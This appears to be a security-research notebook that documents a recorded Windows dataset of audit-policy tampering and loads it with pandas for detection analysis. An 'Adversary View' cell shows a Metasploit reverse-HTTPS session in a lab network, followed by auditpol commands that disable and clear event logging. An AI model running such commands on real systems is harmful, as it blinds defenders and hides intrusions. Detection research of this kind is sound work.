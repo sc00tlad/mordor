{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "1a8cfc5c",
   "metadata": {},
   "source": [
    "# Disabling Windows Event Logging via Audit Policy Modification"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8591a938",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a2899718",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Jose Rodriguez @Cyb3rPandaH |\n",
    "| Creation Date     | 2022/06/30 |\n",
    "| Modification Date | 2022/08/18 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1562.002](https://attack.mitre.org/techniques/T1562/002) |\n",
    "| Tags              | auditpol,cmd,microsoft windows security auditing |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4ad75352",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "After getting a shell with elevated privileges on the target, we used auditpol.exe to modify the current system and user audit policies. Success and failure events were disabled using the /set /remove /clear commands and /success /failure parameters. This dataset was generated using a Windows 10 Pro edition (Version:1903,OS Build:18362.30) and Kali Linux (Version:2022.2)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "15574226",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "73cc505b",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/auditpol_system_user_auditpolicy_modification.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/auditpol_system_user_auditpolicy_modification.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "de34f56a",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4ddd593c",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "51d855f5",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | auditpol.exe | [auditpol.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4238f726",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "msf6 exploit(multi/handler) > run \n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.44; (UUID: gytdwvr9) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 3 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-18 09:56:27 -0400 \n",
    "meterpreter > execute -f auditpol.exe -H -a '/set /user:pedro /category:\"DS Access\" /success:disable' \n",
    "Process 4392 created.\n",
    "meterpreter > execute -f auditpol.exe -H -a '/set /user:pedro /category:\"DS Access\" /failure:disable' \n",
    "Process 6664 created. \n",
    "meterpreter > execute -f auditpol.exe -H -a '/remove /user:pedro' \n",
    "Process 4440 created. \n",
    "meterpreter > execute -f auditpol.exe -H -a '/set /category:\"Account Logon\" /success:disable' \n",
    "Process 472 created. \n",
    "meterpreter > execute -f auditpol.exe -H -a '/set /category:\"Account Logon\" /failure:disable' \n",
    "Process 2752 created. \n",
    "meterpreter > execute -f auditpol.exe -H -a '/clear /y' \n",
    "Process 7016 created. \n",
    "meterpreter > \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c03375db",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b30405a8",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "406ba2bc",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/auditpol_system_user_auditpolicy_modification.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "69dd8bf3",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "29ccdb67",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "add510f8",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d220e097",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8e1d847c",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation) \n",
    "* [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
